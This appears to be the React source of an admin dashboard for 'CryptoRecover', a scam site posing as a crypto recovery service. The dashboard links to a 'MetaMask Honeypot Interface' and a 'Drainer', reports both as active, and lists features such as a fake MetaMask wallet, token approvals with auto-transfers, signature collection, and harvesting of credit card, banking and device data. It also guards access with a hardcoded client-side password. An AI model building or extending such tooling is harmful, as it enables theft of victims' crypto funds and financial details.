import { useState } from 'react';
import Head from 'next/head';

export default function AdminPanel() {
  const [password, setPassword] = useState('');
  const [authenticated, setAuthenticated] = useState(false);

  const handleLogin = () => {
    if (password === 'admin2025') {
      setAuthenticated(true);
    } else {
      alert('Invalid password');
    }
  };

  if (!authenticated) {
    return (
      <>
        <Head>
          <title>Admin Panel - CryptoRecover</title>
        </Head>
        <div className="min-h-screen bg-gray-900 flex items-center justify-center">
          <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
            <h1 className="text-2xl font-bold mb-6 text-center">Admin Access</h1>
            <input
              type="password"
              placeholder="Enter admin password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-3 border rounded-lg mb-4"
              onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
            />
            <button
              onClick={handleLogin}
              className="w-full bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700"
            >
              Login
            </button>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <Head>
        <title>Admin Dashboard - CryptoRecover</title>
      </Head>
      <div className="min-h-screen bg-gray-100 p-4">
        <div className="max-w-6xl mx-auto">
          <h1 className="text-3xl font-bold mb-8">Admin Dashboard</h1>
          
          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">Quick Access</h2>
              <div className="space-y-3">
                <a href="/flashed" className="block bg-orange-500 text-white p-3 rounded hover:bg-orange-600 text-center font-bold">
                  MetaMask Honeypot Interface
                </a>
                <a href="/recovery-services" className="block bg-red-500 text-white p-3 rounded hover:bg-red-600 text-center font-bold">
                  Recovery Services (Drainer)
                </a>
                <a href="/" className="block bg-blue-500 text-white p-3 rounded hover:bg-blue-600 text-center font-bold">
                  Main Landing Page
                </a>
              </div>
            </div>
            
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">System Status</h2>
              <div className="space-y-2">
                <div className="flex justify-between">
                  <span>Honeypot Status:</span>
                  <span className="text-green-600 font-bold">Active</span>
                </div>
                <div className="flex justify-between">
                  <span>Drainer Status:</span>
                  <span className="text-green-600 font-bold">Active</span>
                </div>
                <div className="flex justify-between">
                  <span>Admin Wallet:</span>
                  <span className="text-blue-600 font-mono text-xs">0x849842...c237</span>
                </div>
              </div>
            </div>
          </div>
          
          <div className="mt-8 bg-white p-6 rounded-lg shadow">
            <h2 className="text-xl font-bold mb-4">Feature Access Guide</h2>
            <div className="grid md:grid-cols-3 gap-4">
              <div className="border p-4 rounded">
                <h3 className="font-bold text-green-600">Honeypot Features</h3>
                <ul className="text-sm mt-2 space-y-1">
                  <li>• Fake MetaMask interface</li>
                  <li>• Real token balances</li>
                  <li>• Buy/Swap functionality</li>
                  <li>• Gas fee collection</li>
                </ul>
              </div>
              <div className="border p-4 rounded">
                <h3 className="font-bold text-red-600">Drainer Features</h3>
                <ul className="text-sm mt-2 space-y-1">
                  <li>• Token approvals</li>
                  <li>• Auto-transfers</li>
                  <li>• Signature collection</li>
                  <li>• Multi-chain support</li>
                </ul>
              </div>
              <div className="border p-4 rounded">
                <h3 className="font-bold text-blue-600">Data Collection</h3>
                <ul className="text-sm mt-2 space-y-1">
                  <li>• Credit card info</li>
                  <li>• Banking details</li>
                  <li>• Browser fingerprints</li>
                  <li>• Device data</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}